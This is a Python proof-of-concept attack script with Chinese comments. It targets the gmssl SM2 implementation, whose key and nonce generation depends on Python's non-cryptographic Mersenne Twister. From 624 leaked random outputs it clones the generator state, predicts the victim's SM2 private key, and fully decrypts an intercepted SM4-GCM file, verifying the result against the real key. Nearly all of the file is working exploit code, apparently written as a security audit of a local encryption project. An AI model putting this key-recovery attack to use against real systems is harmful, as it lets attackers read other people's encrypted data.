"""攻击3（旗舰）：Mersenne Twister 状态恢复 → 预测 SM2 私钥 → 完全破密。

漏洞链：
  gmssl.func.random_hex = random.choice(...)      ← Python random = MT19937，非 CSPRNG
  sm2 插件 generate_keypair 用 random_hex 生成私钥  ← 长期私钥来自 MT
  gmssl CryptSM2.encrypt 的临时密钥 k 同样来自 MT  ← 每次加密的 k 来自 MT

威胁模型（无任何社会工程）：
  受害者进程内任何其它代码消费过 random 且输出可被攻击者观察
  （日志/会话号/采样值——Python 生态极常见），624 个 32 位输出即可
  完整克隆 MT 状态；此后同进程内生成的一切 SM2 私钥与 k 全部可预测。

本脚本分两阶段：
  victim 子进程：泄漏窗口 → 真实插件生成密钥对 → 真实引擎加密机密文件；
                 私钥文件放在"攻击者不可见"的目录，只交出观察值和密文。
  attacker 进程：仅凭观察值 + 密文，克隆 MT → 预测私钥 → 解出明文。
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

ART = HERE / "artifacts_mt"


VICTIM_CODE = r'''
# ---------------- 受害者进程（真实软件模块，无任何打桩/mock） ----------------
import random, sys, json
from pathlib import Path

sys.path.insert(0, r"F:\Projects\encryptor")
ART = Path(r"{art}")

# ① 观察信道：进程内某组件（如会话 ID 生成器）使用了 random，
#    其输出对攻击者可见（写入日志/接口返回）。624*32bit = 完整状态。
observed = [random.getrandbits(32) for _ in range(624)]
import struct
(ART / "observed.bin").write_bytes(struct.pack("<624I", *observed))

# ② 受害者操作：SM2 插件生成密钥对（私钥 ← MT！）
from lab import get, KEYS
plugin = get("sm2-sm4-gcm")
hidden = ART / "victim_hidden_keys"      # 攻击者不可见的目录
pub, priv = plugin.generate_keypair(hidden)

# ③ 受害者操作：用公钥加密一份机密文件（k ← 同一条 MT 流！）
from encryptor import engine
secret = ART / "plain_secret.txt"
secret.write_bytes(("SM2-MT 攻击演示明文：导弹发射代码 ALPHA-773492 "
                    "仅限阅后即焚 " + "X" * 90).encode("utf-8"))
engine.encrypt_file(plugin, secret, ART / "intercepted.encx", str(pub))

# ④ 交给攻击者的东西：observed.bin + intercepted.encx。
#    私钥文件、明文文件都留在 victim_hidden_keys / 不会交付。
#    （公钥本来就可分发，不额外提供也不影响攻击。）
print("victim: 泄漏窗口 + 密文就绪")
'''


def _unshift_right_xor(value: int, shift: int) -> int:
    result = value
    for _ in range(32 // shift + 1):
        result = value ^ (result >> shift)
    return result & 0xFFFFFFFF


def _unshift_left_xor(value: int, shift: int, mask: int) -> int:
    result = value
    for _ in range(32 // shift + 1):
        result = value ^ ((result << shift) & mask)
    return result & 0xFFFFFFFF


def untemper(y: int) -> int:
    """MT19937 tempering 的逆变换。"""
    y = _unshift_right_xor(y, 18)
    y = _unshift_left_xor(y, 15, 0xEFC60000)
    y = _unshift_left_xor(y, 7, 0x9D2C5680)
    y = _unshift_right_xor(y, 11)
    return y & 0xFFFFFFFF


def main() -> None:
    import shutil
    if ART.exists():
        shutil.rmtree(ART)
    ART.mkdir(exist_ok=True)

    print("=" * 78)
    print("阶段一：受害者进程（真实软件，真实密文）")
    victim = VICTIM_CODE.replace("{art}", str(ART))
    r = subprocess.run([sys.executable, "-c", victim], cwd=HERE,
                       capture_output=True, text=True)
    print(r.stdout.strip())
    assert r.returncode == 0, r.stderr

    print()
    print("=" * 78)
    print("阶段二：攻击者进程 —— 仅凭 observed.bin + intercepted.encx 行动")

    # ① 克隆 MT 状态
    import struct, random
    observed = struct.unpack("<624I", (ART / "observed.bin").read_bytes())
    state = tuple(untemper(v) for v in observed)
    random.setstate((3, state + (624,), None))

    # ② 复放受害者接下来的随机消耗：
    #    keygen 的 while 循环第 1 次迭代必然通过（d<n 概率 1-2^-128）
    from gmssl import sm2 as gm_sm2, func as gm_func
    predicted_priv_hex = gm_func.random_hex(64)
    print(f"  预测出的受害者 SM2 私钥 d = 0x{predicted_priv_hex[:16]}...")

    # ③ 用预测私钥解开截获密文的元数据（ wrapped CEK ）
    from encryptor.container import read_container
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    with open(ART / "intercepted.encx", "rb") as f:
        info = read_container(f)

    ct_len = int.from_bytes(info.metadata[:2], "big")
    wrapped = info.metadata[2 : 2 + ct_len]
    off = 2 + ct_len
    cek_check = info.metadata[off : off + 32]
    nonce_prefix = info.metadata[off + 32 : off + 32 + 8]

    crypt = gm_sm2.CryptSM2(public_key="", private_key=predicted_priv_hex, mode=1, asn1=False)
    cek = crypt.decrypt(wrapped)

    def sm3(data: bytes) -> bytes:
        h = hashes.Hash(hashes.SM3()); h.update(data); return h.finalize()

    print(f"  SM3(解出的CEK) == 元数据校验值 ? {sm3(cek) == cek_check}")

    # ④ 用 CEK 解密全部 SM4-GCM 载荷块 → 得到明文
    payload = (ART / "intercepted.encx").read_bytes()[
        info.payload_start : info.payload_start + info.payload_len]
    out = bytearray()
    idx = 0
    while True:
        blob = payload[idx * (1024 * 1024 + 16) : (idx + 1) * (1024 * 1024 + 16)]
        if not blob:
            break
        nonce = nonce_prefix + idx.to_bytes(4, "big")
        dec = Cipher(algorithms.SM4(cek), modes.GCM(nonce, blob[-16:])).decryptor()
        out += dec.update(blob[:-16]) + dec.finalize()
        idx += 1

    recovered = bytes(out)
    print(f"  破密得到明文({len(recovered)}B): {recovered[:60].decode('utf-8', 'replace')}...")

    truth = (ART / "plain_secret.txt").read_bytes()
    print()
    print(f"  ★ 完全破密成功 = {recovered == truth}")

    # 对照：受害者私钥文件里的真私钥（仅供验证预测正确，攻击者不需要它）
    priv_file = ART / "victim_hidden_keys" / "sm2_private_key.pem"
    real = priv_file.read_text().split("-----BEGIN SM2 PRIVATE KEY-----")[1] \
                         .split("-----END SM2 PRIVATE KEY-----")[0]
    import base64
    real_hex = base64.b64decode("".join(real.split())).hex()
    print(f"  ★ 预测私钥 == 真私钥 ? {real_hex == predicted_priv_hex}")


if __name__ == "__main__":
    main()
